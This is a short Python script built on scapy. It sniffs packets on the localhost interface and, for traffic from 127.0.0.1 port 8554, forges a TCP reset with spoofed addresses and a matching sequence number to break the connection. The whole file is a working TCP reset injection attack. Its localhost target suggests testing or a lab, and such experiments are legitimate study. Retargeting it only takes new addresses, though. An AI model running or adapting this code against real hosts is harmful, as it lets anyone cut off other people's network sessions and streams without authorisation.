from scapy.all import *
from scapy.all import IP, TCP
import ifaddr

# actually send a forged rst
def send_rst(p):
    src_ip = p[IP].src
    dst_ip = p[IP].dst
    src_port = p[TCP].sport
    dst_port = p[TCP].dport

    # craft rst
    rst_pkt = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", seq=p[TCP].ack)

    # send rst
    send(rst_pkt, verbose=0)
    print(f"RST packet sent to disrupt connection from {src_ip}:{src_port} to {dst_ip}:{dst_port}")

# check if packet matches your targete
def check_packet(client_ip, server_ip, server_port):
    def f(p):
        if p.haslayer(IP) and p.haslayer(TCP):
            # IPs are from IP layer
            src_ip = p[IP].src
            dst_ip = p[IP].dst
            # ports are in TCP
            src_port = p[TCP].sport
            dst_port = p[TCP].dport

			# check if packet matches
            if src_ip == server_ip and src_port == server_port and dst_ip == client_ip:
                print(f"Packet found: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
                send_rst(p)
                return True
        # return none instead of false so each each packet doesn't return false
        return None
    return f

if __name__ == "__main__":
    print("Initializing...")
    LOCALHOST = "127.0.0.1"
    TARGET_PORT = 8554
    adapters = ifaddr.get_adapters()

    # Find all localhost adapters
    local_ifaces = [adapter.nice_name for adapter in adapters if any(ip.ip == LOCALHOST for ip in adapter.ips)]

    if not local_ifaces:
        print("No localhost adapters found.")
        exit(1)
    
    iface = local_ifaces[0]
    print(f"Using interface: {iface}")

    print("Sniffing...")
    # for some reason it prints what it returns
    sniff(
        iface=iface,
        prn=check_packet(LOCALHOST, LOCALHOST, TARGET_PORT),
        store=0
    )
